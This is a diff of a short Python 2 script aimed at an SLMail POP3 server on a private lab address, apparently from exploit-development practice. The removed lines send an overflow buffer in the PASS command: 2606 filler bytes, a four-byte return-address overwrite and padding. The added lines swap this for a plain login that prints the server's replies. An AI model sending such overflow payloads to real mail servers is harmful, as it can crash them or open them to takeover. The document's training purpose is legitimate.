@@ -3,15 +3,22 @@
 import socket
 
 def main():
-	buffer = 'A' * 2606 + "\xe3\x41\x4b\x5f" + 'C' * 390
 	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 	try:
-		print "\n[*]Sending evil buffer..."
+		print "\n[*]Connecting to SLMail Server..."
 		s.connect(('192.168.220.130', 110))
-		s.recv(1024)
-		s.send('USER test\r\n')
-		s.recv(1024)
-		s.send('PASS ' + buffer + '\r\n')
+		data = s.recv(1024)
+		print data
+
+		s.send('USER administrator\r\n')
+		data = s.recv(1024)
+		print data
+
+		s.send('PASS 123456\r\n')
+		data = s.recv(1024)
+		print data
+
+		s.close()
 		print "\n[*]Done!"
 	except:
 		print "[-]Can't connect to POP3 !"
